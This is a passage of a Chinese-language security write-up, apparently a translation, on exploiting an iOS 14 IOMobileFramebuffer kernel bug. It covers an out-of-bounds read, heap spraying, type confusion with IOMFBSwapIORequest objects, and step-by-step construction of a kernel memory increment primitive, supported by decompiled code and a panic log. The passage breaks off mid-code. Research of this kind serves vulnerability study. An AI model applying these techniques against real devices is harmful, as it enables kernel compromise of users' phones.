<p>总结一下，新的zone垃圾收集zone扩展流程提供了一个真正强有力的保证：因为被封存的页面的虚拟内存实际上并没有释放到zone映射上，所以不可能将这些虚拟内存重新用于其他分区。支持KHEAP_DATA_BUFFERS的区域没有被封存，不同于KHEAP_DEFAULT和KHEAP_KEXT，KHEAP_DATA_BUFFERS单独存在于一个地方。</p>
<h2 id="Pipe管道"><a href="#Pipe管道" class="headerlink" title="Pipe管道"></a>Pipe管道</h2><p>我们可以越界读取一个在kext.kalloc.6144内的、巨大的、0x13a0字节的UnifiedPipeline对象中的内联数组<code>IOSurface*[]</code>，kext.kalloc.6144的内存区域比较稳定，所以对这个区域进行喷射，分配的内存会落在这个UnifiedPipeline对象的周围。由于数组的访问是通过<code>*(UnifiedPipeline + 0xa98 + (0x8 * idx))</code>的形式进行的，因此可以从UnifiedPipeline对象中读出任何指针字段，并对其进行类型混淆。下面是去除内核指针后的字段:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;offset&gt;:&lt;对象类&gt; (&lt;大小&gt;)</span><br><span class="line"><span class="number">0x18</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x20</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x30</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0x60</span>: 	<span class="built_in">IOServicePM</span> (<span class="number">0x288</span>)</span><br><span class="line"><span class="number">0x7f8</span>: 	<span class="built_in">IOSurface</span>  (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x810</span>: 	<span class="built_in">IODMACommand</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0xb28</span>: 	<span class="built_in">IOMFBSwapIORequest</span> (<span class="number">0x640</span>)</span><br><span class="line"><span class="number">0xba8</span>: 	<span class="built_in">IODARTMapper</span> (<span class="number">0x690</span>)</span><br><span class="line"><span class="number">0xbb0</span>: 	<span class="built_in">IOSurfaceRoot</span> (<span class="number">0x1f0</span>)</span><br><span class="line"><span class="number">0xbb8</span>: 	<span class="built_in">IOCommandGate</span> (<span class="number">0x50</span>)</span><br><span class="line"><span class="number">0xbc0</span>: 	<span class="built_in">IOWorkLoop</span> (<span class="number">0x48</span>)</span><br><span class="line"><span class="number">0xbc8</span>: 	<span class="built_in">IOSurface</span> (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0xbd0</span>: 	<span class="built_in">IOPMServiceInterestNotifier</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0xbd8</span>: 	<span class="built_in">IOInterruptEventSource</span> (<span class="number">0x68</span>)</span><br><span class="line"><span class="number">0xbe0</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0xbe8</span>: 	<span class="built_in">IOTimerEventSource</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd30</span>: 	<span class="built_in">IOSurfaceDeviceMemoryRegion</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd40</span>: 	<span class="built_in">IOCommandPool</span> (<span class="number">0x38</span>)</span><br><span class="line"><span class="number">0xd68</span>: 	<span class="built_in">AppleMobileFileIntegrity</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0x1230</span>: <span class="built_in">VideoInterfaceMipi</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0x12d8</span>: <span class="built_in">AppleARMBacklight</span> (<span class="number">0x358</span>)</span><br></pre></td></tr></table></figure>

<p>这里要选取大小比IOSurface大的对象，就是IOSurface、IOMFBSwapIORequest和IODARTMapper。POC触发内核Panic的函数是IOSurfaceSendRight::init，IOSurface是其第三个参数，如果使用IOSurface来进行堆喷，则不能造成类型混淆。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceSendRight::<span class="built_in">init</span>(IOSurfaceSendRight *__hidden <span class="keyword">this</span>, IOSurfaceRoot *, IOSurface *)</span><br></pre></td></tr></table></figure>

<p>IODARTMapper不是一个可以从应用程序沙盒中创建的对象，因此，只能选择IOMFBSwapIORequest。</p>
<p>通过对IOMobileFramebufferUserClient进行逆向分析，可以看到有很多包含swap的外部方法:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">External method <span class="number">4</span>: IOMobileFramebufferUserClient::s_swap_start</span><br><span class="line">External method <span class="number">5</span>: IOMobileFramebufferUserClient::s_swap_submit</span><br><span class="line">External method <span class="number">6</span>: IOMobileFramebufferUserClient::s_swap_wait</span><br><span class="line">External method <span class="number">20</span>: IOMobileFramebufferUserClient::s_swap_signal</span><br><span class="line">External method <span class="number">52</span>: IOMobileFramebufferUserClient::s_swap_cancel</span><br><span class="line">External method <span class="number">69</span>: IOMobileFramebufferUserClient::s_swap_set_color_matrix</span><br><span class="line">External method <span class="number">81</span>: IOMobileFramebufferUserClient::s_swap_cancel_all</span><br></pre></td></tr></table></figure>

<p>可以在应用程序沙盒内访问IOMobileFramebufferUserClient，继续分析</p>
<p>外部方法4：调用IOMobileFramebufferUserClient::s_swap_start时，将会进入IOMobileFramebufferLegacy::swap_start。该函数调用 IOMFBSwapIORequest::create 来分配一个新的IOMFBSwapIORequest对象。在一点初始化之后，新创建的swap的 swap ID被计算出来，并作为这个外部方法的唯一输出传回给我们。因此，可以实现从用户空间创建IOMFBSwapIORequests。</p>
<p>但是，我们无法控制IOMobileFramebufferUserClient::s_swap_start对新创建的IOMFBSwapIORequest的初始化操作。</p>
<p>外部方法5：IOMobileFramebufferUserClient::s_swap_submit的输入参数对任何超过0x280字节的大小，都会报错（至少对于14.6和14.7）。</p>
<p>要 “提交 “的IOMFBSwapIORequest的swap ID是通过结构输入而传递的。在调用 IOMobileFramebufferUserClient::s_swap_submit 之后，我们最终会在 UnifiedPipeline::swap_submit 中结束。这是一个大函数，它将我们的大部分结构输入复制到与我们指定的swap ID相对应的IOMFBSwapIORequest对象。结构输入中没有被直接复制到对象中的部分是像IOSurface ID这样的东西。这些ID被用来推导IOSurface指针，这些指针被写入对象中。这个函数的一个有趣之处在于它从结构输入中读取一个用户空间指针，从该指针和当前任务中创建一个IOBufferMemoryDescriptor对象，然后从该内存中复制0x20c字节到IOMFBSwapIORequest对象，从偏移量0x366开始。所以我们真的有0x280+0x20c字节的控制输入。但由于IOMFBSwapIORequest::create将其分配的IOMFBSwapIORequest清零，这些字节仍然为零，这对漏洞利用开发来说并没有什么区别。</p>
<p>类型混淆的第三个要求：在偏移量0xc0处会有一个非空指针，在偏移量0x3f0处会有一个非空（或NULL）指针。首先，让我们检查一下我们是否对这些字节有控制权，因为这意味着我们将能够自己创造这些条件。恼人的是，这个函数是以这样的方式编译的，很难快速地用眼看到我们是否对偏移量0xc0有控制。尽管如此，我们确实控制了这八个字节。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; *(_DWORD *)(found_swap + <span class="number">356</span> + <span class="number">4LL</span> * j); ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v26 = (<span class="type">int</span> *)(input_swap + <span class="number">268</span> + ((__int64)j &lt;&lt; <span class="number">6</span>));</span><br><span class="line">  v27 = v26[<span class="number">4</span> * k + <span class="number">1</span>];</span><br><span class="line">  v28 = v26[<span class="number">4</span> * k + <span class="number">2</span>];</span><br><span class="line">  v29 = v26[<span class="number">4</span> * k + <span class="number">3</span>];</span><br><span class="line">  v30 = (_DWORD *)(found_swap + <span class="number">113</span> + ((__int64)j &lt;&lt; <span class="number">6</span>) + <span class="number">0x10LL</span> * (<span class="type">int</span>)k);</span><br><span class="line">  *v30 = v26[<span class="number">4</span> * k];</span><br><span class="line">  v30[<span class="number">1</span>] = v27;</span><br><span class="line">  v30[<span class="number">2</span>] = v28;</span><br><span class="line">  v30[<span class="number">3</span>] = v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>found_swap是我们要提交的IOMFBSwapIORequest，input_swap是我们的结构输入。*(_DWORD *)(found_swap + 356 + 4LL * j)是可控的，但被验证为落在[0, 4]范围内。相反，很容易看到我们也控制了偏移量为0x3f0的8个字节，因为那是0x20c字节区域的一部分，它是由我们在结构输入上提供的用户空间指针复制过来的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(found_swap + <span class="number">868</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; *(input_swap + <span class="number">56</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  *(found_swap + <span class="number">869</span>) = <span class="number">1</span>;</span><br><span class="line">  v55 = <span class="number">0LL</span>;</span><br><span class="line">  address = *(input_swap + <span class="number">56</span>);</span><br><span class="line">  task = <span class="built_in">current_task</span>();</span><br><span class="line">  v55 = IOMemoryDescriptor::<span class="built_in">withAddressRange</span>(address, <span class="number">0x20CuLL</span>, <span class="number">3u</span>, task);</span><br><span class="line">  <span class="keyword">if</span> ( v55 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v55-&gt;prepare)(v55, <span class="number">0LL</span>) )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Failure to prepare memory descriptor\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    v54 = <span class="number">-1431655766</span>;</span><br><span class="line">    v54 = (v55-&gt;readBytes)(v55, <span class="number">0LL</span>, found_swap + <span class="number">0x366</span>, <span class="number">0x20CLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v54 != <span class="number">0x20CLL</span> )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Mismatched data size\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (v55-&gt;complete)(v55, <span class="number">0LL</span>);</span><br><span class="line">    (v55-&gt;release_0)(v55);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以控制偏移量为0xc0和0x3f0的指针。如果我们用这个对象输入混淆，那么我们就可以在内核内存的任何地方做32位增量。唯一要弄清楚的是，我们是否能得到一个指向我们提交给UnifiedPipeline对象的IOMFBSwapIORequest对象的指针。这个问题的答案就在UnifiedPipeline::swap_submit的底部。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v63 = IOMobileFramebufferLegacy::<span class="built_in">swap_queue</span>(UnifiedPipeline, found_swap);</span><br></pre></td></tr></table></figure>

<p>经过对该函数的逆向分析，发现在UnifiedPipeline对象中，有一个IOMFBSwapIORequest对象的尾队列，从偏移量0xb18开始。最终，IOMobileFramebufferLegacy::queue_move_entry_gated被调用。在它的中间附近，有一个明显的<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/queue">TAILQ_INSERT_TAIL</a>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(found_swap + <span class="number">0x630</span>) = <span class="number">0LL</span>;</span><br><span class="line">*(found_swap + <span class="number">0x638</span>) = UnifiedPipeline_swap_tailq_B18-&gt;tqe_last;</span><br><span class="line">*UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = found_swap;</span><br><span class="line">UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = (found_swap + <span class="number">0x630</span>);</span><br></pre></td></tr></table></figure>

<p>由于<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/sys/queue.h#L600">TAILQ_HEAD</a>宏将tqe_last初始化为指向tqe_first的地址，第三行将found_swap写到UnifiedPipeline对象的偏移量0xb18。因此，每次我们成功调用IOMobileFramebufferUserClient::s_swap_submit时，我们可以指望一个指向结构输入中指定的交换的指针出现在UnifiedPipeline对象的偏移量0xb18处。</p>
<p>有了到目前为止我们所知道的一切，我们应该能够通过以下步骤来增加32位的内核内存:</p>
<ol>
<li>用IOMobileFramebufferUserClient::s_swap_start创建一个新的IOMFBSwapIORequest。</li>
<li>使用IOMobileFramebufferUserClient::s_swap_submit来获取在步骤1中创建的IOMFBSwapIORequest对象的偏移量0xc0和0x3f0的受控字节。0xc0将是我们提供的内核指针，0x3f0将是NULL。该交换对象的指针将被写入UnifiedPipeline对象的偏移量0xb18。</li>
<li>调用 IOMobileFramebufferUserClient::s_displayed_fb_surface 的越界下标16，因为0xb18 - 0xa98是0x80，而 0x80&#x2F;sizeof(IOMFBSwapIORequest *) 是16。我们将进入IOSurfaceSendRight::init，oob_surface指向IOMFBSwapIORequest对象，IOSurface::increment_use_count将愉快地增加该交换的八个受控字节在偏移量0xc0所指向的32位。<ol>
<li>0xa98是IOSurface数组的偏移量，我们可以从它那里越界读。</li>
</ol>
</li>
</ol>
<p>通过在swap的偏移量0xc0处放置一个类似0x41414142424的指针来测试这个方法。如果内核在OSIncrementAtomic中解除对它的引用，那么我们就成功了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;bug_type&quot;</span>:<span class="string">&quot;210&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2021-11-03 13:06:45.00 -0400&quot;</span>,<span class="string">&quot;os_version&quot;</span>:<span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,<span class="string">&quot;incident_id&quot;</span>:<span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;build&quot;</span> : <span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,</span><br><span class="line">  <span class="string">&quot;product&quot;</span> : <span class="string">&quot;iPhone10,4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kernel&quot;</span> : <span class="string">&quot;Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015&quot;</span>,</span><br><span class="line">  <span class="string">&quot;incident&quot;</span> : <span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>,</span><br><span class="line">  <span class="string">&quot;crashReporterKey&quot;</span> : <span class="string">&quot;1db1b5662483938458430f8a3af5439dc5f1064d&quot;</span>,</span><br><span class="line">  <span class="string">&quot;date&quot;</span> : <span class="string">&quot;2021-11-03 13:06:45.03 -0400&quot;</span>,</span><br><span class="line">  <span class="string">&quot;panicString&quot;</span> : <span class="string">&quot;panic(cpu 2 caller 0xfffffff028aff2d4): Unaligned kernel data abort. at pc 0xfffffff0289b230c, lr 0xfffffff028e5409c (saved state: 0xffffffe8045eb380)</span></span><br><span class="line"><span class="string">    x0: 0x4141414142424256  x1:  0x0000000000000000  x2:  0xfffffff0289b4fac  x3:  0x0000000000000000</span></span><br><span class="line"><span class="string">    x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x0000000000000330</span></span><br><span class="line"><span class="string">    x8: 0x0000000000000001  x9:  0x0000000000000001  x10: 0x0000000000000002  x11: 0xffffffe4cc2ca458</span></span><br><span class="line"><span class="string">    x12: 0x0000000000000001 x13: 0x0000000000000002  x14: 0xffffffe19cc1a920  x15: 0x0000000000000003</span></span><br><span class="line"><span class="string">    x16: 0x0000000000000000 x17: 0x000000000000000f  x18: 0xfffffff028aed000  x19: 0xffffffe4cc2ca450</span></span><br><span class="line"><span class="string">    x20: 0x0000000000000001 x21: 0x0000000000000000  x22: 0xffffffe4cc1a0860  x23: 0x00000000e00002c2</span></span><br><span class="line"><span class="string">    x24: 0x0000000000000000 x25: 0xffffffe8045ebaec  x26: 0xffffffe4cd7601f0  x27: 0xffffffe4cd80ebf4</span></span><br><span class="line"><span class="string">    x28: 0x0000000000000000 fp:  0xffffffe8045eb6e0  lr:  0xfffffff028e5409c  sp:  0xffffffe8045eb6d0</span></span><br><span class="line"><span class="string">    pc:  0xfffffff0289b230c cpsr: 0x60400204         esr: 0x96000021          far: 0x4141414142424256</span></span><br></pre></td></tr></table></figure>

<p>为什么x0不是0x41414142424242，是因为IOSurface::increment_use_count在它传递给OSIncrementAtomic的指针上增加了0x14。</p>
<h2 id="oob-surface-surface-id存在的问题"><a href="#oob-surface-surface-id存在的问题" class="headerlink" title="oob_surface-&gt;surface_id存在的问题"></a>oob_surface-&gt;surface_id存在的问题</h2><p>每次用IOMobileFramebufferUserClient::s_displayed_fb_surface做增量时，都会通过其标量输出返回一个Mach端口名称。在内核中，这个端口是由一个IOSurfaceSendRight对象支持的。IOSurfaceSendRight是一个小对象，通常携带一个指向IOSurface的指针。但对我们来说，这将是一个指向 IOMFBSwapIORequest 对象的指针，为了简单起见，从现在起将这些端口称为 “swap端口”。</p>
<p>当我们在这里处理端口时，99%的IOSurface kext都在处理ID。更大的情形是这样的：每个IOSurfaceRootUserClient客户端都维护它自己的IOSurfaceClient对象数组。IOSurface ID实际上只是该数组的一个索引。如果某个索引的IOSurfaceClient指针是NULL，那么这个索引就被认为是一个自由的IOSurface ID。IOSurfaceClient对象是携带一个指向IOSurface的指针。这可以用一行代码来总结。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurface *surface = IOSurfaceRootUserClient-&gt;surface_client_array[surface_id]-&gt;surface;</span><br></pre></td></tr></table></figure>

<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture.png"></p>
<p>绿色方框代表结构字段。IOSurfaceRootUserClient的IOSurfaceClient指针数组在偏移量0x118，IOSurfaceClient对象的IOSurface指针在偏移量0x40。</p>
<p>对于这个kext的99%来说，如果某个IOSurface ID没有IOSurfaceClient对象，那么这个ID对应的IOSurface对象就可能不存在。而这正是我们的问题–我们只有一个端口。幸运的是，IOSurfaceRootUserClient的外部方法34，IOSurfaceRootUserClient::s_lookup_surface_from_port，旨在解决这个问题。它接收一个由IOSurfaceSendRight对象支持的Mach端口，并吐出一个IOSurface ID，以及许多其他的字节，我不知道其目的是什么。</p>
<p>我的第一个想法是使用IOSurfaceRootUserClient::s_lookup_surface_from_port来获得一个swap端口的ID。然后我就用这个ID和其他IOSurfaceRootUserClient的外部方法结合起来，尝试泄露IOSurface的指针，这些指针被写到IOMobileFramebufferUserClient::s_swap_submit里面的交换对象。</p>
<p>当调用IOSurfaceRootUserClient::s_lookup_surface_from_port与一个swap端口时，它将意识到没有IOSurfaceClient对象存在，而这个对象是连接到支持的IOSurfaceSendRight对象的IOMFBSwapIORequest。因此，一个新的IOSurfaceClient对象将被分配，IOSurfaceClient::init将被调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">IOSurfaceClient::init_IOSurfaceRootUserClient___IOSurface___bool</span><span class="params">(</span></span><br><span class="line"><span class="params">        IOSurfaceClient *a1,</span></span><br><span class="line"><span class="params">        IOSurfaceRootUserClient *iosruc,</span></span><br><span class="line"><span class="params">        IOSurface *oob_surface,</span></span><br><span class="line"><span class="params">        <span class="type">char</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface_id = <span class="number">0</span>;</span><br><span class="line">  a1-&gt;m.user_client = iosruc;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceRootUserClient::set_surface_handle(iosruc, a1, oob_surface-&gt;surface_id) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  a1-&gt;m.surface_id = oob_surface-&gt;surface_id;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span>  </span><br><span class="line"></span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  field_B8 = surface-&gt;field_B8;</span><br><span class="line">  v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8</span>LL))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就像IOSurfaceSendRight::init一样，oob_surface指向一个IOMFBSwapIORequest对象。对IOSurfaceRootUserClient::set_surface_handle的调用正是为了使新的IOSurfaceClient对象在IOSurface kext中可见。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::set_surface_handle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *iosruc,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *iosc,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 wanted_handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( wanted_handle &amp;&amp; iosruc-&gt;m.surface_client_array_capacity &gt; wanted_handle )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  result = IOSurfaceRootUserClient::<span class="built_in">alloc_handles</span>(iosruc);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">    surface_client_array = iosruc-&gt;m.surface_client_array;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array[wanted_handle] )</span><br><span class="line">      <span class="built_in">panic</span>(</span><br><span class="line">        <span class="string">&quot;\&quot;IOSurfaceRootUserClient::set_surface_handle asked to set handle %08x that was not free: %p\&quot;&quot;</span>,</span><br><span class="line">        wanted_handle,</span><br><span class="line">        iosruc-&gt;m.surface_client_array[wanted_handle]);</span><br><span class="line">    surface_client_array[wanted_handle] = iosc;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果这个函数成功，一个带有指向IOMFBSwapIORequest的指针的IOSurfaceClient对象将被注册在IOSurfaceRootUserClient对象的IOSurfaceClient数组内，该对象被用于调用IOSurfaceRootUserClient::s_lookup_surface_from_port。还有最后一个问题：wanted_handle参数的值是什么？因为它来自oob_surface-&gt;surface_id，让我们检查surface_id的偏移量（x20是oob_surface）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDR             W2, [X20,#0xC] ; a3</span><br><span class="line">MOV             X0, X21 ; a1</span><br><span class="line">MOV             X1, X19 ; iosruc</span><br><span class="line">BL              IOSurfaceRootUserClient__set_surface_handle</span><br></pre></td></tr></table></figure>

<p>所以IOSurface的surface_id是偏移量为0xc处的32位值。我们能控制IOMFBSwapIORequest对象上偏移量0xc处的32位值吗？不能，因为 IOMFBSwapIORequest::create 会将新的 IOMFBSwapIORequest 对象清零。那么如果它是零呢？这不还是一个有效的ID吗？答案又是否定的，因为IOSurface的ID是从1开始的。零被认为是一个无效的ID。</p>
<p>IOSurfaceClient::init也有一个问题，就是靠近底部的虚函数调用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">surface = a1-&gt;m.surface;</span><br><span class="line">field_B8 = surface-&gt;field_B8;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8LL</span>))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们想让IOSurfaceClient::init返回一个成功代码，这个调用是不可避免的。虽然我们确实控制了偏移量0x38的八个字节（这就是qword38所代表的），但我们没有办法伪造vtable指针的PAC。</p>
<p>看起来利用IOSurfaceRootUserClient::s_lookup_surface_from_port来获取一个swap端口的IOSurface ID是不可能的了。</p>
<h2 id="猜测游戏"><a href="#猜测游戏" class="headerlink" title="猜测游戏"></a>猜测游戏</h2><p>zone map并不是唯一可以在内核中进行控制分配的地方。kalloc系列函数有一些非常好的东西：如果分配的大小太大，无法放入任何zone，那么就会从zone map之外返回内存。所有的kalloc变体都会调用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L875">kalloc_ext</a>，它首先会根据传入的分配大小选择区域。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_ext</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *addr;</span><br><span class="line">    <span class="type">zone_t</span> 